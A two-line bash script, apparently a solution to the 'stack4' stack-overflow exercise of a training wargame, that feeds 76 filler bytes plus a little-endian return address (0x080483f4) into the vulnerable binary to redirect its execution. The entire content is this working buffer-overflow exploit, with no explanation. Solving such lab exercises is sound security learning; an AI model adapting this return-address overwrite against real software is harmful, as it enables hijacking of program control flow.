#!/usr/bin/bash

python -c 'from struct import pack as p; print "A" * 76 + p("<L",0x080483f4)' | ./stack4
